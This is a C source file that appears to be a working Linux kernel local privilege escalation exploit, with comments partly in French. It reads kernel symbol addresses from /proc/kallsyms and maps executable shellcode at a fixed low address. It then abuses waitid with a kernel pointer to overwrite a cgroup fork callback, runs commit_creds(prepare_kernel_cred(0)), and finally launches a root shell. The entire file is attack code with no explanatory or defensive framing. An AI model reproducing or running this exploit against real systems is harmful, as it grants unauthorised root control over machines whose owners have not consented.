#define _GNU_SOURCE
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
 
struct cred;
struct task_struct;

void * page;

struct trap_frame{
    unsigned long long rip;
    unsigned long long cs;
    unsigned long long eflags;
    unsigned long long rsp;
    unsigned long long ss;
}__attribute__((packed));
struct trap_frame tf;


typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));
  
prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

unsigned long long croup_fork;
void payload(void){  
    commit_creds(prepare_kernel_cred(0));
    asm("movq (croup_fork),%rax;movq $0, (%rax);swapgs;mov $tf,%rsp;iretq;");
}

void get_shell() {
  
  if (getuid() == 0){
    printf("[+] Root shell success !! :)\n");
    execl("/bin/sh", "sh", NULL);
	exit(0);
  }
  printf("[-] failed to get root shell :(\n");
}
 
  
unsigned long get_kernel_sym(char *name)
{
  FILE *f;
  unsigned long addr;
  char dummy;
  char sname[256];
  int ret = 0;
  f = fopen("/proc/kallsyms", "r");
  if (f == NULL) {
    printf("[-] Failed to open /proc/kallsyms\n");
    exit(-1);
  }
  printf("[+] Find %s...\n", name);
  while(ret != EOF) {
    ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
    if (ret == 0) {
      fscanf(f, "%s\n", sname);
      continue;
    }
    if (!strcmp(name, sname)) {
      fclose(f);
      printf("[+] Found %s at %lx\n", name, addr);
      return addr;
    }
  }
  fclose(f);
  return 0;
}

static void save_state() 
{
	asm(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"pushfq\n"
	"popq %2\n"
	: "=r" (tf.cs), "=r" (tf.ss), "=r" (tf.eflags) : : "memory");
	tf.rip = &get_shell;
	tf.rsp = page+0x400000;
}

int main(int ac, char **av)
{
	  unsigned long long call_addr;
    static const unsigned char shellcode[] = {
        0xff, 0x15, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    };
	page = mmap(0x13370000,0x500000,3,34,-1,0);
	save_state();
    // 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions
    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
    commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
	croup_fork=prepare_kernel_cred + 0xec529aL;
	call_addr=prepare_kernel_cred + 0xdd5c50L - 0x16;
    // have_canfork_callback offset <= rendre dynamique aussi
     
    pid_t     pid;
    /* siginfo_t info; */
 
    // 1 - Mapper la mmoire  l'adresse 0xef0000
    printf("[+] Try to allocat 0xef0000...\n");
    if (mmap(0x0000000000ef0000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){
        printf("[-] Failed to allocat 0xef0000\n");
        return -1;
    }
    printf("[+] Allocation success !\n");
    memcpy((unsigned long long) 0x0000ef0000, shellcode, 0x20);
    *(unsigned long long *)(sizeof(shellcode)+0x0000ef0000) = (unsigned long)payload;
	printf("memcpy success !\n");


	if(-1 == (pid = fork())) {
        perror("fork()");
        return EXIT_FAILURE;
    }
    if(pid == 0) {
        _exit(0xDEADBEEF);
        perror("son");
        return EXIT_FAILURE;
    }

	waitid(P_PID, pid, call_addr, WEXITED | WSTOPPED | WCONTINUED);
	

	if(-1 == (pid = fork())) {
        perror("fork()");
        return EXIT_FAILURE;
    }
    if(pid == 0) {
        _exit(0xDEADBEEF);
        perror("son");
        return EXIT_FAILURE;
    }
	printf("cgroup :%p\n",croup_fork);
	printf("pid value is :%x\n",pid);
    //siginfo_t *ptr = (siginfo_t*)strtoul(av[1], (char**)0, 0);
    siginfo_t *ptr = prepare_kernel_cred + 0xec529aL;
    waitid(P_PID, pid, ptr, WEXITED | WSTOPPED | WCONTINUED);
 
// TRIGGER
    pid = fork();
    printf("fork_ret = %d\n", pid); 
    if (pid > 0)
        get_shell();
    return 0;
}
